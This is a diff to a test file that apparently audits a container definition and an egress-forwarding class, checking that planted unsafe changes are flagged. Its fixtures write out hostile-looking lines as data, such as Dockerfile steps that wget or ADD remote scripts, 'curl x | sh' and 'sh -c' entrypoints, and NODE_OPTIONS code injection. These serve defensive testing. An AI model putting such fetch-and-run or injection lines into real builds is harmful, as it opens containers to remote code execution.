@@ -4,7 +4,7 @@ import { describe, expect, test } from 'bun:test';
 import { readFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { CONTAINER_IMAGES, imageReference, readSource, sourceHash } from './container-images';
-import { auditForwarder, forwarderCallerReasons, ownerValueReasons, publicMethods, type ForwarderInputs } from './egress-interception';
+import { auditForwarder, type ForwarderInputs } from './egress-interception';
 
 const REPO = join(import.meta.dir, '..');
 
@@ -53,9 +53,9 @@ describe('a direct Container is admitted only with all three proofs', () => {
       ['uses `RUN`', (text) => text.replace('USER node', 'RUN wget https://example.com/agent.js\nUSER node')],
       ['uses `ENTRYPOINT`', (text) => text.replace(/^CMD /mu, 'ENTRYPOINT ["sh", "-c", "$CODE"]\nCMD ')],
       ['uses `ONBUILD`', (text) => text.replace('USER node', 'ONBUILD RUN wget https://example.com/agent.js\nUSER node')],
-      ['uses `ADD`', (text) => text.replace('COPY server.mjs .', 'ADD https://example.com/agent.js .\nCOPY server.mjs .')],
-      ['uses `RUN`', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs \\\n  .\nLABEL a=b \\\nRUN=1\nRUN \\\n  wget https://example.com/x')],
-      ['not a tracked file', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs \\\n  agent.js .')],
+      ['uses `ADD`', (text) => text.replace('COPY server.mjs policy.mjs .', 'ADD https://example.com/agent.js .\nCOPY server.mjs policy.mjs .')],
+      ['uses `RUN`', (text) => text.replace('COPY server.mjs policy.mjs .', 'COPY server.mjs policy.mjs \\\n  .\nLABEL a=b \\\nRUN=1\nRUN \\\n  wget https://example.com/x')],
+      ['not a tracked file', (text) => text.replace('COPY server.mjs policy.mjs .', 'COPY server.mjs \\\n  agent.js .')],
       ['not a pinned digest', (text) => text.replace(/^FROM .*$/mu, 'FROM node:22-alpine')],
       ['not one tracked script', (text) => text.replace(/^CMD .*$/mu, 'CMD ["node", "-e", "require(process.env.CODE)"]')],
       ['sets a NODE_ variable', (text) => text.replace('USER node', 'ENV NODE_OPTIONS=--import=data:text/javascript,x\nUSER node')],
@@ -70,59 +70,28 @@ describe('a direct Container is admitted only with all three proofs', () => {
     }
   });
 
-  test('(c) any way to the container but a guarded containerFetch keeps it in the set', () => {
+  test('(c) a way for a caller to change what the container runs keeps it in the set', () => {
     const text = live().fileText;
-    const guard = 'if (!codexEgressAllowed({ method: request.method, url: request.url })) {';
-    const cancel = '  cancel(callId: string): void {';
-    const member = (added: string): string => text.replace(cancel, `${added}\n\n${cancel}`);
+    const start = '  override async start(): Promise<void> {\n    await super.start();\n  }\n';
+    const ports = 'await super.startAndWaitForPorts(this.defaultPort, cancellation?.abort === undefined ? undefined : { abort: cancellation.abort });';
+
+    expect(text).toContain(start);
+    expect(text).toContain(ports);
 
     const cases: ReadonlyArray<readonly [string, string]> = [
-      ['touches `this.exec`', member('  async run(command: string) { return this.exec(command); }')],
-      ['touches `this.start`', member("  async boot() { await this.start({ entrypoint: ['sh', '-c', 'curl x | sh'] }); }")],
-      ['declares `entrypoint`', text.replace('  sleepAfter = ', "  entrypoint = ['sh', '-c', 'curl x | sh'];\n\n  sleepAfter = ")],
-      ['declares `envVars`', text.replace('  sleepAfter = ', "  envVars = { NODE_OPTIONS: '--import=x' };\n\n  sleepAfter = ")],
-      ['overrides `start`', member('  override async start() { return super.start(); }')],
-      ['touches `this.fetch`', member('  async pass(request: Request) { return this.fetch(request); }')],
-      ['reads a computed member', member("  async pass(request: Request) { return this['containerFetch'](request); }")],
-      ['other than by calling it directly', member('  async pass(request: Request) { const send = this.containerFetch.bind(this); return send(request); }')],
-      ['lets `this` escape', text.replace('export class CodexEgress', 'function drive(box: CodexEgress) { return box; }\n\nexport class CodexEgress').replace(cancel, `  leak() { return drive(this); }\n\n${cancel}`)],
-      ['no top-level', text.replace(guard, "const check = () => { if (!codexEgressAllowed({ method: request.method, url: request.url })) throw new KinuError('denied', 'x'); };\n    if (false) {")],
-      ['no top-level', text.replace(guard, "if (!codexEgressAllowed({ method: 'GET', url: 'https://chatgpt.com/backend-api/codex/models' })) {")],
-      ['no top-level', text.replace('        method: request.method,', '        method: other.method,').replace('async forward(ownerUserId: string, callId: string, request: Request)', 'async forward(ownerUserId: string, callId: string, request: Request, other: Request)')],
-      ['no top-level', text.replace(guard, 'if (!request.url) {')],
-      ['no top-level', text.replace("import { codexEgressAllowed, EgressCalls } from '@kinu.run/core';", "import { EgressCalls } from '@kinu.run/core';\nconst codexEgressAllowed = (_: unknown): boolean => true;")],
-      ['non-arrow function', member('  async pass(request: Request) { const self = this; return (function () { return self; })(); }')],
+      ['super.start with arguments', text.replace(start, '  override async start(options?: object): Promise<void> {\n    await super.start(options);\n  }\n')],
+      ['does not override `start`', text.replace(start, '')],
+      ['super.startAndWaitForPorts with other than', text.replace(ports, 'await super.startAndWaitForPorts(_ports as number, undefined, { entrypoint: [\'sh\'] });')],
+      ['declares `entrypoint`', text.replace('  sleepAfter = \'5m\';', '  sleepAfter = \'5m\';\n\n  entrypoint = [\'sh\', \'-c\', \'id\'];')],
+      ['touches `this.envVars`', text.replace('    await super.start();', '    this.envVars = { NODE_OPTIONS: \'--require /tmp/x\' };\n    await super.start();')],
       ['carries a decorator', text.replace('export class CodexEgress', '@withRun\nexport class CodexEgress')],
-      ['carries a decorator', text.replace(cancel, `  @boot\n${cancel}`)],
-      ['is used as a value', `${text}\nCodexEgress.prototype.run = function run() { return 1; };\n`],
-      ['is used as a value', `${text}\nObject.assign(CodexEgress.prototype, { run() { return 1; } });\n`],
-      ['no top-level', text.replace("    const headers = new Headers(request.headers);", "    request = new Request('https://chatgpt.com/backend-api/codex/responses', { method: 'POST' });\n    const headers = new Headers(request.headers);")],
+      ['does not override `allowHost`', text.replace('  override async allowHost(): Promise<void> { refuseOutbound(); }\n', '')],
+      ['computed name', text.replace('    await super.start();', '    await this[\'st\' + \'art\']();')],
     ];
 
-    for (const [reason, fileText] of cases) {
-      expect({ reason, changed: fileText !== text }).toEqual({ reason, changed: true });
-      expect({ reason, found: auditForwarder({ ...live(), fileText }).join('\n').includes(reason) }).toEqual({ reason, found: true });
-    }
-  });
-
-  test('every reach for the binding goes through the route, to the class\'s own methods', () => {
-    const route = 'packages/cf-backend/src/egress/codex-egress-route.ts';
-    const routeText = readFileSync(join(REPO, route), 'utf8');
-    const methods = new Set(publicMethods('CodexEgress', FILE, live().fileText));
-    const clean = new Map([[FILE, live().fileText], [route, routeText]]);
-
-    expect([...methods].sort()).toEqual(['cancel', 'forward']);
-    expect(forwarderCallerReasons('CodexEgress', methods, clean)).toEqual([]);
-    expect(ownerValueReasons('CodexEgress', new Map([[route, routeText]]))).toEqual([]);
-
-    const planted: ReadonlyArray<readonly [string, string, string]> = [
-      ['not one of its own methods', route, routeText.replace('stub.cancel(callId)', "stub.start({ entrypoint: ['sh'] })")],
-      ['other than through its route', 'packages/cf-backend/src/boot.ts', "import type { CodexEgress } from './egress/codex-egress';\nexport const boot = (env: Env) => env.CodexEgress.get(env.CodexEgress.idFromName('u')).start();\n"],
-      ['destructures', 'packages/cf-backend/src/boot.ts', "import type { CodexEgress } from './egress/codex-egress';\nexport const boot = ({ CodexEgress: ns }: Env) => ns;\n"],
-    ];
-
-    for (const [reason, path, text] of planted) {
-      const found = forwarderCallerReasons('CodexEgress', methods, new Map([...clean, [path, text]])).join('\n');
+    for (const [reason, planted] of cases) {
+      expect(planted).not.toBe(text);
+      const found = auditForwarder({ ...live(), fileText: planted }).join('\n');
 
       expect({ reason, found: found.includes(reason) }).toEqual({ reason, found: true });
     }
